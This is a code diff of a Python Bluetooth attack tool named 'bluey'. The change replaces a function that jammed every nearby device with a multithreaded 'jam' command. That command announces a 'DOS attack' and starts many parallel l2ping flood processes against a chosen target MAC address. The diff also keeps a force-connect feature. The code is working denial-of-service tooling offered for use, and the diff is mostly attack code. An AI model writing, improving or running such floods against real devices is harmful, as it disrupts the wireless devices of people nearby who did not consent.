@@ -4,18 +4,21 @@ import art
 import subprocess
 from alive_progress import alive_bar
 import time
-from threading import Thread
+import threading
 
 blocked_addr = []
-
+global packetsize
+global interface
+global threads_count
+os.system("clear")
 art.tprint("bluey")
 print("=====================================")
 print("Author: Logan Goins\n")
 print("I am not responsible for any damages or misuse from this software.\nThis software is used at your own risk\n")
 
 
-def jam_raw():
-    subprocess.check_output("sudo l2ping -i {interface} -s {packetsize} -f {target}}".split(" "))
+def DOS(target, packetsize):
+    os.system('l2ping -i hci0 -s ' + str(packetsize) +' -f ' + target)
 
 
 
@@ -58,72 +61,27 @@ def force_connect(target):
             subprocess.call(connect)
             bar()
 
-def passive_prevent(target):
-    if target not in blocked_addr:
-        subprocess.check_output("sudo l2ping -i {interface} -s {packetsize} -f {target}}".split(" "))
-
-def passive_scan():
-    try:
-        
-        if interface == " ":
-            print("Bluetooth Interface not set")
-            main()
-        if packetsize == " ":
-            print("Packet size not set")
-            main()
-        
-
-        os.system("clear")
-
-        threads = []
 
 
-        while True:       
-            nearby_devices = discover_devices(lookup_names=True)
-            
-            print(" ")
-        
-            for name, addr in nearby_devices:
-                print("Blocked devices:")
-                print (" > %s - %s" % (addr, name))
-                threads.append(Thread(target=passive_prevent, args=(addr,)))               
-                threads[-1].start()
-                blocked_addr.append(addr)
+def jam(threads_count, packetsize):
+   
+    print("\x1b[31m[*] Starting DOS attack in 3 seconds...")
 
+    for i in range(0, 3):
+        print('[*] ' + str(3 - i))
+        time.sleep(1)
+    os.system('clear')
 
-            print(" \n")
-            print(" ")
-            
-            # Wait for threads to finish
-            for thread in threads:
-                thread.join()
+    print("Building Threads")
+    for i in range(0, int(threads_count)):
+         
+        print('[*] Built thread №' + str(i + 1))
+        threading.Thread(target=DOS, args=[str(target), str(packetsize)]).start()
 
-        
-    except OSError as error:
-        print(error)
-        print("Make sure your bluetooth adapter is up and connected")
-        main()
-
-
-def jam():
-
-    threads = []
-
-    if interface == " ":
-        print("Bluetooth Interface not set")
-        main()
-    if packetsize == " ":
-        print("Packet size not set")
-        main()
-    if target == " ":
-        print("target not set")
-        main()
-
-    print("Starting packet flow")
-    subprocess.check_output("sudo l2ping -i {interface} -s {packetsize} -f {target}}".split(" "))
-    threads.append(Thread(target=jam_raw()))               
-    threads[-1].start()
-
+    
+    print('[*] Built all threads...')
+    print('[*] Starting...')
+    
 def help_menu():
     print(" \n")
     print("Commands")
@@ -134,6 +92,7 @@ def help_menu():
     print("set target <target>          ---  sets target MAC address for later use")
     print("set interface <interface>    ---  sets bluetooth interface for use")
     print("set packetsize <packet size> ---  sets packet size for use with the \"jam\" command (in bytes)")
+    print("set threads <thread number>  ---  sets number of threads for attack")
     print("clear                        ---  clears terminal window")
     print("jamall                       ---  jam all devices as soon as detecting")
     print(" ")
@@ -169,24 +128,30 @@ def main():
             target = arg
             print(target + " ---> target\n")
 
+
+        if cmd == "set" and subcmd == "threads":
+            
+            threads_count = arg
+            print(threads_count + " ---> threads\n")
+
+
         if cmd == "jam":
-            jam()
+            if packetsize == "" or target == "" or threads_count == "":
+                print("You need to set the packetsize, target, and threads for this command")
+            jam(threads_count, packetsize)
 
         if cmd == "set" and subcmd == "packetsize":
-            global packetsize
+            
             packetsize = arg
             print(packetsize + " ---> packet size\n")
 
         if cmd == "set" and subcmd == "interface" :
-            global interface
+            
             interface = arg
             print(interface + " ---> bluetooth interface\n")
 
         if cmd == "forceconnect":
             force_connect(target)
-
-        if cmd == "jamall":
-            passive_scan()
 
         if cmd == "help":
             help_menu()
@@ -199,4 +164,5 @@ def main():
 
 
 if __name__ == "__main__":
+    
     main()
